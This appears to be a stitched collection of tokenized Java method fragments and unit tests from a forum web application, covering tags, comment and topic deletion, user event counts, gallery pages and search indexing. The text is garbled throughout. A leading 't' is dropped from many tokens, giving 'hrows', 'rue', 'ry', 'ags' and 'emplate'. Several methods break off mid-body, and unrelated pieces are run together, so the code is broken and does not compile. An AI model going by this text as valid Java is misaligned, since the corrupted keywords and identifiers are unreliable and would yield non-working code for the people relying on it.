public void imageInfoTest2 ( ) hrows Exception { for ( int i = 0 ; i < 10000 ; i + + ) { ImageParam param = imageCheckTestPass2 ( ) ; 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter ) hrows TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " ags " ) ; SortedSet < String > firstLetters = agService . getFirstLetters ( ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . first ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < String , Integer > ags = agService . getTagsByPrefix ( firstLetter , 1 ) ; if ( ags . isEmpty ( ) ) { hrow new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " ags " , ags ) ; return modelAndView ; } 
List < String > showTagListHandlerJSON ( @RequestParam ( " erm " ) final String erm ) { Map < String , Integer > ags = agService . getTagsByPrefix ( erm , 2 ) ; return ImmutableList . copyOf ( Iterables . filter ( ags . keySet ( ) , new Predicate < String > ( ) { @Override 
public boolean apply ( String input ) { return TagService . isGoodTag ( input ) ; } 
public void prefixSearchExactTest ( ) { agDao . createTag ( " zest " ) ; agDao . createTag ( " zesd " ) ; Map < String , Integer > ags = agDao . getTagsByPrefix ( " zest " , 0 ) ; assertEquals ( 1 , ags . size ( ) ) ; } 
public void prefixSearchSimpleTest ( ) { agDao . createTag ( " zest " ) ; agDao . createTag ( " zesd " ) ; Map < String , Integer > ags = agDao . getTagsByPrefix ( " ze " , 0 ) ; assertEquals ( 2 , ags . size ( ) ) ; } 
public void prefixSearchEscapeTest ( ) { agDao . createTag ( " zest_test " ) ; agDao . createTag ( " zestxtest " ) ; assertEquals ( 1 , agDao . getTagsByPrefix ( " zest_ " , 0 ) . size ( ) ) ; assertEquals ( 0 , agDao . getTagsByPrefix ( " zest% " , 0 ) . size ( ) ) ; } 
public void prefixSearchEscapeTest2 ( ) { agDao . createTag ( " zest__test " ) ; agDao . createTag ( " zest_xtest " ) ; assertEquals ( 2 , agDao . getTagsByPrefix ( " zest_ " , 0 ) . size ( ) ) ; assertEquals ( 1 , agDao . getTagsByPrefix ( " zest__ " , 0 ) . size ( ) ) ; assertEquals ( 1 , agDao . getTagsByPrefix ( " zest__t " , 0 ) . size ( ) ) ; } 
List < String > showTagListHandlerJSON ( @RequestParam ( " erm " ) final String erm ) { SortedSet < String > ags = agService . suggestTagsByPrefix ( erm , 20 ) ; return ImmutableList . copyOf ( Iterables . filter ( ags , new Predicate < String > ( ) { @Override 
public void processRow ( ResultSet resultSet ) hrows SQLException { res . add ( resultSet . getString ( " value " ) ) ; } 
private static String escapeLikeWildcards ( String str ) { return str . replaceAll ( " [_%] " , " \\ \\ $0 " ) ; } 
public SortedSet < String > suggestTagsByPrefix ( String prefix , int count ) { return agDao . getTopTagsByPrefix ( prefix , 2 , count ) ; } 
public void prefixTopSearchExactTest ( ) { agDao . createTag ( " zest " ) ; agDao . createTag ( " zesd " ) ; Set < String > ags = agDao . getTopTagsByPrefix ( " zest " , 0 , 20 ) ; assertEquals ( 1 , ags . size ( ) ) ; } 
List < String > showTagListHandlerJSON ( @RequestParam ( " erm " ) final String erm ) { SortedSet < String > ags = agService . suggestTagsByPrefix ( erm , 10 ) ; return ImmutableList . copyOf ( Iterables . filter ( ags , new Predicate < String > ( ) { @Override 
public ModelAndView gallery ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_GALLERY ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_GALLERY ) , opicListForm ) ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; modelAndView . addObject ( " rssLink " , " section-rss.jsp?section=3 " ) ; return modelAndView ; } 
public ModelAndView forum ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_FORUM ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_FORUM ) , opicListForm ) ) ; modelAndView . addObject ( " url " , " /forum/lenta " ) ; modelAndView . addObject ( " rssLink " , " section-rss.jsp?section=2 " ) ; return modelAndView ; } 
public ModelAndView news ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_NEWS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " url " , " /news/ " ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_NEWS ) , opicListForm ) ) ; modelAndView . addObject ( " rssLink " , " section-rss.jsp?section=1 " ) ; return modelAndView ; } 
public boolean isUserCastAllowed ( User author ) { return ! author . isAnonymousScore ( ) ; } 
public void resetUnreadReplies ( int userId ) { jdbcTemplate . update ( " UPDATE users SET unread_events=0 where id=? " , userId ) ; jdbcTemplate . update ( " UPDATE user_events SET unread=false WHERE userid=? AND unread " , userId ) ; } 
public void recalcEventCount ( Collection < Integer > userids ) { if ( userids . isEmpty ( ) ) { return ; } namedJdbcTemplate . update ( " UPDATE users SET unread_events = (SELECT count(*) FROM user_events WHERE unread AND userid=users.id) WHERE users.id IN (:list) " , 
public void estRecalc ( ) { createSimpleEvent ( ) ; assertEquals ( 1 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; userEventDao . deleteTopicEvents ( TEST_TOPIC_ID , ImmutableSet . of ( UserEventFilterEnum . TAG . getType ( ) ) ) ; assertEquals ( 1 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; userEventDao . recalcEventCount ( ImmutableList . of ( TEST_USER_ID ) ) ; assertEquals ( 0 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; } 
public UserEventDao userEventDao ( ) { return new UserEventDao ( ) ; } 
public IgnoreListDao ignoreListDao ( ) { return Mockito . mock ( IgnoreListDao . class ) ; } 
public UserLogDao userLogDao ( ) { return Mockito . mock ( UserLogDao . class ) ; } 
public List < Integer > deleteWithReplys ( Topic opic , Comment comment , String reason , User user , int scoreBonus ) { CommentList commentList = getCommentList ( opic , false ) ; CommentNode node = commentList . getNode ( comment . getId ( ) ) ; List < CommentAndDepth > replys = getAllReplys ( node , 0 ) ; List < Integer > deleted = deleteReplys ( comment , reason , replys , user , - scoreBonus ) ; userEventService . processCommentsDeleted ( deleted ) ; return deleted ; } 
public void deleteCommentEvents ( Collection < Integer > comments ) { if ( comments . isEmpty ( ) ) { return ; } namedJdbcTemplate . update ( " DELETE FROM user_events WHERE comment_id IN (:list) AND type in ('REPLY', 'WATCH', 'REF') " , 
public void processCommentsDeleted ( List < Integer > msgids ) { userEventDao . deleteCommentEvents ( msgids ) ; } 
public boolean preHandle ( HttpServletRequest request , HttpServletResponse response , Object handler ) hrows Exception { if ( handler instanceof ResourceHttpRequestHandler | | handler instanceof DefaultServletHttpRequestHandler ) { return rue ; } String name ; if ( handler instanceof HandlerMethod ) { name = ( ( HandlerMethod ) handler ) . getBeanType ( ) . getSimpleName ( ) ; } else { name = handler . getClass ( ) . getSimpleName ( ) ; } Slf4JStopWatch watch = new Slf4JStopWatch ( name ) ; watch . setTimeThreshold ( TIME_THRESHOLD ) ; request . setAttribute ( ATTRIBUTE , watch ) ; return rue ; } 
private HttpEntity < LoginStatus > entity ( LoginStatus status ) { HttpHeaders headers = new HttpHeaders ( ) ; headers . add ( " Access-Control-Allow-Origin " , siteConfig . getMainUrlWithoutSlash ( ) ) ; headers . add ( " Access-Control-Allow-Credentials " , " rue " ) ; return new HttpEntity < > ( status , headers ) ; } 
public List < PreparedGalleryItem > prepare ( List < GalleryItem > items ) { String htmlPath = siteConfig . getHTMLPathPrefix ( ) ; ImmutableList . Builder < PreparedGalleryItem > builder = ImmutableList . builder ( ) ; for ( GalleryItem item : items ) { ry { ImageInfo iconInfo = new ImageInfo ( htmlPath + item . getImage ( ) . getIcon ( ) ) ; ImageInfo fullInfo = new ImageInfo ( htmlPath + item . getImage ( ) . getOriginal ( ) ) ; builder . add ( new PreparedGalleryItem ( item , userDao . getUserCached ( item . getUserid ( ) ) , iconInfo , fullInfo ) ) ; } catch ( FileNotFoundException e ) { logger . error ( " Image not found! id={}: {} " , item . getImage ( ) . getId ( ) , e . getMessage ( ) ) ; } catch ( BadImageException | IOException e ) { logger . error ( " Bad image id={} " , item . getImage ( ) . getId ( ) , e ) ; } } return builder . build ( ) ; } 
public SpringTemplateLoader emplateLoader ( ) { SpringTemplateLoader emplateLoader = new SpringTemplateLoader ( ) ; emplateLoader . setBasePath ( " emplate/ " ) ; return emplateLoader ; } 
public JadeConfiguration jadeConfiguration ( SpringTemplateLoader loader ) { JadeConfiguration cfg = new JadeConfiguration ( ) ; cfg . setPrettyPrint ( false ) ; cfg . setCaching ( rue ) ; cfg . setTemplateLoader ( loader ) ; return cfg ; } 
public JadeTemplate emplateSign ( JadeConfiguration cfg ) hrows IOException { return cfg . getTemplate ( " sign " ) ; } 
public JadeTemplate emplateComment ( JadeConfiguration cfg ) hrows IOException { return cfg . getTemplate ( " comment " ) ; } 
private String processUploadImage ( HttpServletRequest request ) hrows IOException , ScriptErrorException { if ( request instanceof MultipartHttpServletRequest ) { MultipartFile multipartFile = ( ( MultipartRequest ) request ) . getFile ( " image " ) ; if ( multipartFile ! = null & & ! multipartFile . isEmpty ( ) ) { File uploadedFile = File . createTempFile ( " preview " , " " , new File ( siteConfig . getPathPrefix ( ) + " /linux-storage/tmp/ " ) ) ; String image = uploadedFile . getPath ( ) ; if ( ( uploadedFile . canWrite ( ) | | uploadedFile . createNewFile ( ) ) ) { ry { logger . debug ( " Transfering upload to: " + image ) ; multipartFile . ransferTo ( uploadedFile ) ; return image ; } catch ( Exception e ) { hrow new ScriptErrorException ( " Failed to write uploaded file " , e ) ; } } else { logger . info ( " Bad target file name: " + image ) ; } } } return null ; } 
private PreparedImage prepareImage ( @Nonnull Image image , boolean secure ) { Preconditions . checkNotNull ( image ) ; String mediumName = image . getMedium ( ) ; String htmlPath = siteConfig . getHTMLPathPrefix ( ) ; if ( ! new File ( htmlPath , mediumName ) . exists ( ) ) { mediumName = image . getIcon ( ) ; } ry { ImageInfo mediumImageInfo = new ImageInfo ( htmlPath + mediumName ) ; 
public ModelAndView activate ( HttpServletRequest request , @RequestParam String activation ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized! " ) ; } User user = mpl . getCurrentUser ( ) ; String newEmail = userDao . getNewEmail ( user ) ; if ( newEmail = = null ) { hrow new AccessViolationException ( " new_email == null?! " ) ; } String regcode = user . getActivationCode ( siteConfig . getSecret ( ) , newEmail ) ; if ( ! regcode . equals ( activation ) ) { hrow new AccessViolationException ( " Bad activation code " ) ; } userDao . acceptNewEmail ( user , newEmail ) ; return new ModelAndView ( new RedirectView ( " /people/ " + user . getNick ( ) + " /profile " ) ) ; } 
private RootNode prepareTopicRootNode ( boolean minimizeCut , String cutURL , boolean secure , boolean nofollow ) { RootNode rootNode = defaultParser . getRootNode ( ) ; if ( minimizeCut ) { ry { LorURL lorCutURL = new LorURL ( siteConfig . getMainURI ( ) , cutURL ) ; if ( lorCutURL . isTrueLorUrl ( ) ) { URI fixURI = new URI ( lorCutURL . fixScheme ( secure ) , rue , " UTF-8 " ) ; rootNode . setMinimizedTopicCutOptions ( fixURI ) ; } else { rootNode . setMaximizedTopicCutOptions ( ) ; } } catch ( Exception e ) { rootNode . setMaximizedTopicCutOptions ( ) ; } } else { rootNode . setMaximizedTopicCutOptions ( ) ; } rootNode . setUserDao ( userDao ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( oHtmlFormatter ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
public String memberURL ( User user , boolean secure ) hrows URIException { URI mainUri = siteConfig . getMainURI ( ) ; String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } return ( new URI ( scheme , null , mainUri . getHost ( ) , mainUri . getPort ( ) , String . format ( " /people/%s/profile " , user . getNick ( ) ) ) ) . getEscapedURIReference ( ) ; } 
public void processUrl ( boolean secure , boolean nofollow , @Nonnull StringBuilder out , @Nonnull String urlHref , @Nullable String linktext ) hrows URIException { LorURL url = new LorURL ( siteConfig . getMainURI ( ) , urlHref ) ; if ( url . isMessageUrl ( ) ) { processMessageUrl ( secure , out , url , linktext ) ; 
public void init ( ) hrows Exception { maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . henReturn ( false ) ; when ( JB . isBlocked ( ) ) . henReturn ( false ) ; when ( isden . isBlocked ( ) ) . henReturn ( rue ) ; when ( maxcom . getNick ( ) ) . henReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . henReturn ( " JB " ) ; when ( isden . getNick ( ) ) . henReturn ( " isden " ) ; userDao = mock ( UserDao . class ) ; when ( userDao . getUser ( " maxcom " ) ) . henReturn ( maxcom ) ; when ( userDao . getUser ( " JB " ) ) . henReturn ( JB ) ; when ( userDao . getUser ( " isden " ) ) . henReturn ( isden ) ; when ( userDao . getUser ( " hizel " ) ) . henThrow ( new UserNotFoundException ( " hizel " ) ) ; mainUrl = " http:127.0.0.1:8080/ " ; mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . henReturn ( mainUrl ) ; oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( userDao ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void initTest ( ) hrows Exception { userDao = mock ( UserDao . class ) ; user = mock ( User . class ) ; when ( user . isBlocked ( ) ) . henReturn ( false ) ; when ( user . getNick ( ) ) . henReturn ( " splinter " ) ; when ( userDao . getUser ( " splinter " ) ) . henReturn ( user ) ; mainUrl = " http:127.0.0.1:8080/ " ; mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . henReturn ( mainUrl ) ; oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( userDao ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; } 
private boolean deleteTopic ( int mid , User moderator , String reason , int bonus ) { boolean deleted = opicDao . delete ( mid ) ; if ( deleted ) { deleteInfoDao . insert ( mid , moderator , reason , bonus ) ; userEventService . processTopicDeleted ( ImmutableList . of ( mid ) ) ; } return deleted ; } 
public List < Integer > deleteByIPAddress ( String ip , Timestamp startTime , User moderator , String reason ) { List < Integer > opicIds = opicDao . getAllByIPForUpdate ( ip , startTime ) ; return massDelete ( moderator , opicIds , reason ) ; } 
private List < Integer > massDelete ( User moderator , Iterable < Integer > opics , String reason ) { List < Integer > deletedTopics = new ArrayList < > ( ) ; for ( int mid : opics ) { boolean deleted = opicDao . delete ( mid ) ; if ( deleted ) { deleteInfoDao . insert ( mid , moderator , reason , 0 ) ; deletedTopics . add ( mid ) ; } } userEventService . processTopicDeleted ( deletedTopics ) ; return deletedTopics ; } 
public void deleteTopicEvents ( Collection < Integer > opics ) { if ( opics . isEmpty ( ) ) { return ; } namedJdbcTemplate . update ( " DELETE FROM user_events WHERE message_id IN (:list) AND type IN ('TAG', 'REF', 'REPLY', 'WATCH') " , 
public void processTopicDeleted ( Collection < Integer > msgids ) { userEventDao . deleteTopicEvents ( msgids ) ; } 
public void estAddRemove ( ) { createSimpleEvent ( ) ; List < UserEvent > events = userEventDao . getRepliesForUser ( TEST_USER_ID , rue , 50 , 0 , null ) ; assertEquals ( 1 , events . size ( ) ) ; userEventDao . deleteTopicEvents ( ImmutableList . of ( TEST_TOPIC_ID ) ) ; List < UserEvent > eventsAfterDelete = userEventDao . getRepliesForUser ( TEST_USER_ID , rue , 50 , 0 , null ) ; assertEquals ( 0 , eventsAfterDelete . size ( ) ) ; } 
public void estRemoveSyntax ( ) { userEventDao . deleteTopicEvents ( ImmutableList . of ( TEST_TOPIC_ID ) ) ; } 
public void estRecalc ( ) { createSimpleEvent ( ) ; assertEquals ( 1 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; userEventDao . deleteTopicEvents ( ImmutableList . of ( TEST_TOPIC_ID ) ) ; assertEquals ( 1 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; userEventDao . recalcEventCount ( ImmutableList . of ( TEST_USER_ID ) ) ; assertEquals ( 0 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; } 
public List < Integer > deleteTopicEvents ( Collection < Integer > opics ) { if ( opics . isEmpty ( ) ) { return ImmutableList . of ( ) ; } List < Integer > affectedUsers = namedJdbcTemplate . queryForList ( " SELECT DISTINCT (userid) FROM user_events " + " WHERE message_id IN (:list) AND type IN ('TAG', 'REF', 'REPLY', 'WATCH') " , ImmutableMap . of ( " list " , opics ) , Integer . class ) ; namedJdbcTemplate . update ( " DELETE FROM user_events WHERE message_id IN (:list) AND type IN ('TAG', 'REF', 'REPLY', 'WATCH') " , ImmutableMap . of ( " list " , opics ) ) ; return affectedUsers ; } 
public List < Integer > deleteCommentEvents ( Collection < Integer > comments ) { if ( comments . isEmpty ( ) ) { return ImmutableList . of ( ) ; } List < Integer > affectedUsers = namedJdbcTemplate . queryForList ( " SELECT DISTINCT (userid) FROM user_events " + " WHERE comment_id IN (:list) AND type in ('REPLY', 'WATCH', 'REF') " , ImmutableMap . of ( " list " , comments ) , Integer . class ) ; namedJdbcTemplate . update ( " DELETE FROM user_events WHERE comment_id IN (:list) AND type in ('REPLY', 'WATCH', 'REF') " , ImmutableMap . of ( " list " , comments ) ) ; return affectedUsers ; } 
public void processTopicDeleted ( Collection < Integer > msgids ) { userEventDao . recalcEventCount ( userEventDao . deleteTopicEvents ( msgids ) ) ; } 
public void processCommentsDeleted ( List < Integer > msgids ) { userEventDao . recalcEventCount ( userEventDao . deleteCommentEvents ( msgids ) ) ; } 
public void estRecalc ( ) { createSimpleEvent ( ) ; assertEquals ( 1 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; List < Integer > affected = userEventDao . deleteTopicEvents ( ImmutableList . of ( TEST_TOPIC_ID ) ) ; assertEquals ( 1 , affected . size ( ) ) ; assertEquals ( 1 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; userEventDao . recalcEventCount ( ImmutableList . of ( TEST_USER_ID ) ) ; assertEquals ( 0 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; } 
public List < String > relatedTags ( int agid ) { return jdbcTemplate . queryForList ( " select value from " + 
public ModelAndView agPage ( HttpServletRequest request , @PathVariable String ag ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; agService . checkTag ( ag ) ; ModelAndView mv = new ModelAndView ( " ag-page " ) ; mv . addObject ( " ag " , ag ) ; mv . addObject ( " itle " , WordUtils . capitalize ( ag ) ) ; mv . addObject ( " counter " , agService . getCounter ( ag ) ) ; if ( mpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; } int agId = agService . getTagId ( ag ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( agId ) ) ; List < String > relatedTags = agService . getRelatedTags ( agId ) ; if ( relatedTags . size ( ) > 1 ) { mv . addObject ( " relatedTags " , relatedTags ) ; } mv . addAllObjects ( getNewsSection ( request , ag ) ) ; mv . addAllObjects ( getGallerySection ( ag , agId , mpl ) ) ; mv . addAllObjects ( getForumSection ( ag , agId ) ) ; return mv ; } 
public void estRelatedTags ( ) { List < String > ags = agDao . relatedTags ( 30 ) ; assertNotNull ( ags ) ; } 
public void deleteTest ( ) hrows Exception { when ( agDao . getTagId ( " InvalidTestTag " ) ) . henThrow ( new TagNotFoundException ( " TagNotFoundException " ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " InvalidTestTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " estTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " estTag " , " estTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " estTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
private boolean checkMemoriesPresent ( User user , boolean watch ) { List < Integer > present = jdbcTemplate . queryForList ( " select memories.id from memories join topics on memories.topic=topics.id where memories.userid=? and watch=? and not deleted limit 1; " , Integer . class , user . getId ( ) , watch ) ; return ! present . isEmpty ( ) ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId , HttpServletRequest request ) { Template mpl = Template . getTemplate ( request ) ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; Section section = null ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; modelAndView . addObject ( " section " , section ) ; modelAndView . addObject ( " addlink " , AddTopicController . getAddUrl ( section ) ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 1 ) ; List < Topic > messages = opicListService . getAllTopicsFeed ( section , calendar . getTime ( ) ) ; modelAndView . addObject ( " messages " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false ) ) ; List < TopicListDto . DeletedTopic > deleted = opicListService . getDeletedTopicsFeed ( sectionId ) ; modelAndView . addObject ( " deletedTopics " , deleted ) ; modelAndView . addObject ( " sections " , sectionService . getSectionList ( ) ) ; return modelAndView ; } 
public MappingJackson2HttpMessageConverter jsonConverter ( ) { MappingJackson2HttpMessageConverter converter = new MappingJackson2HttpMessageConverter ( ) ; converter . setPrettyPrint ( rue ) ; converter . getObjectMapper ( ) . configure ( SerializationFeature . WRITE_DATES_AS_TIMESTAMPS , false ) ; return converter ; } 
private void prepareTopicsForPlainOrRss ( HttpServletRequest request , ModelAndView modelAndView , boolean rss , List < Topic > messages ) { if ( rss ) { modelAndView . addObject ( 
public void editCommentTest ( ) { int commentId = jdbcTemplate . queryForObject ( " select nextval('s_msgid') " , Integer . class ) ; addComment ( commentId , null , " CommentDaoIntegrationTest.editCommentTest() " , " CommentDaoIntegrationTest.editCommentTest(): comment body " ) ; Comment oldComment = mock ( Comment . class ) ; when ( oldComment . getId ( ) ) . henReturn ( commentId ) ; Comment newComment = mock ( Comment . class ) ; when ( newComment . getTitle ( ) ) . henReturn ( " CommentDaoIntegrationTest.editCommentTest(): new title " ) ; commentDao . edit ( oldComment , newComment , " est body " ) ; List < Map < String , Object > > rows = getComment ( commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; Map < String , Object > row = rows . get ( 0 ) ; assertEquals ( " CommentDaoIntegrationTest.editCommentTest(): new title " , row . get ( " itle " ) ) ; rows = jdbcTemplate . queryForList ( " SELECT * FROM msgbase WHERE id=? " , commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; row = rows . get ( 0 ) ; assertEquals ( " est body " , row . get ( " message " ) ) ; } 
public void updateLatestEditorInfoTest ( ) { int commentId = jdbcTemplate . queryForObject ( " select nextval('s_msgid') " , Integer . class ) ; addComment ( commentId , null , " CommentDaoIntegrationTest.updateLatestEditorInfoTest() " , " comment body " ) ; List < Map < String , Object > > rows = getComment ( commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; Map < String , Object > row = rows . get ( 0 ) ; assertNull ( row . get ( " edit_nick " ) ) ; assertNull ( row . get ( " edit_date " ) ) ; assertEquals ( 0 , row . get ( " edit_count " ) ) ; Date commentEditDate = new Date ( ) ; commentDao . updateLatestEditorInfo ( commentId , 1 , commentEditDate , 1234 ) ; rows = getComment ( commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; row = rows . get ( 0 ) ; Timestamp rowTimestamp = ( Timestamp ) row . get ( " edit_date " ) ; assertEquals ( " maxcom " , row . get ( " edit_nick " ) ) ; assertEquals ( rowTimestamp . getTime ( ) , commentEditDate . getTime ( ) ) ; assertEquals ( 1234 , row . get ( " edit_count " ) ) ; } 
public void isHaveAnswersTest ( ) { int commentId1 = jdbcTemplate . queryForObject ( " select nextval('s_msgid') " , Integer . class ) ; int commentId2 = jdbcTemplate . queryForObject ( " select nextval('s_msgid') " , Integer . class ) ; addComment ( commentId1 , null , " CommentDaoIntegrationTest.isHaveAnswersTest() - 1 " , " comment body " ) ; assertEquals ( 0 , commentDao . getReplaysCount ( commentId1 ) ) ; addComment ( commentId2 , commentId1 , " CommentDaoIntegrationTest.isHaveAnswersTest() - 2 " , " comment body " ) ; assertTrue ( commentDao . getReplaysCount ( commentId1 ) > 0 ) ; } 
private int createUser ( String userName ) { int userid = jdbcTemplate . queryForObject ( " SELECT nextval('s_uid') AS userid " , Integer . class ) ; jdbcTemplate . update ( " INSERT INTO users (id, name, nick) VALUES (?, ?, ?) " , userid , userName , userName ) ; return userid ; } 
public void addTest ( ) { prepareUserTags ( ) ; userTagDao . addTag ( user1Id , ag1Id , false ) ; int result ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_IGNORE_BY_USER , Integer . class , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_FAVORITE_BY_USER , Integer . class , user2Id ) ; assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_IGNORE_BY_USER , Integer . class , user2Id ) ; assertEquals ( " Wrong count of user tags. " , 0 , result ) ; result = jdbcTemplate . queryForObject ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , Integer . class , ag1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void replaceTagTest ( ) { int result ; prepareUserTags ( ) ; userTagDao . replaceTag ( ag2Id , ag1Id ) ; result = jdbcTemplate . queryForObject ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , Integer . class , ag1Id ) ; assertEquals ( " Wrong count of user tags. " , 2 , result ) ; userTagDao . deleteTags ( ag1Id ) ; userTagDao . replaceTag ( ag2Id , ag1Id ) ; result = jdbcTemplate . queryForObject ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , Integer . class , ag1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void makeTitle ( ) { given when String actualResult = StringUtil.makeTitle("\"Test of \"quotes '' \"in quotes\" in title\"\""); then assertEquals("&#171;Test of &#8222;quotes &quot; &#8222;in quotes&#8220; in title&#8220;&#187;", actualResult); } 
public ImmutableList < CommentNode > childs ( ) { return childs ; } 
public void addChild ( CommentNodeBuilder child ) { childs . add ( child ) ; } 
public CommentNode build ( ) { return new CommentNode ( comment , Lists . ransform ( childs , new Function < CommentNodeBuilder , CommentNode > ( ) { 
public CommentNode apply ( CommentNodeBuilder input ) { return input . build ( ) ; } 
public Client elastic ( ) { return new TransportClient ( ) . addTransportAddress ( new InetSocketTransportAddress ( " 127.0.0.1 " , 9300 ) ) ; 
public void handleMessage ( UpdateMessage msgUpdate ) hrows MessageNotFoundException , IOException , SolrServerException { logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; reindexMessage ( msgUpdate . getMsgid ( ) , msgUpdate . isWithComments ( ) ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) hrows IOException , SolrServerException , MessageNotFoundException { Topic msg = opicDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) & & ! msg . isDraft ( ) ) { updateMessage ( msg ) ; } else { client . prepareDelete ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( msg . getId ( ) ) ) . execute ( ) . actionGet ( ) ; logger.info("Deleting message "+msgid+" from solr"); } if (withComments) { CommentList commentList = commentService.getCommentList(msg, true); 
private void executeBulk ( BulkRequestBuilder bulkRequest ) { if ( bulkRequest . numberOfActions ( ) > 0 ) { BulkResponse bulkResponse = bulkRequest . execute ( ) . actionGet ( ) ; 
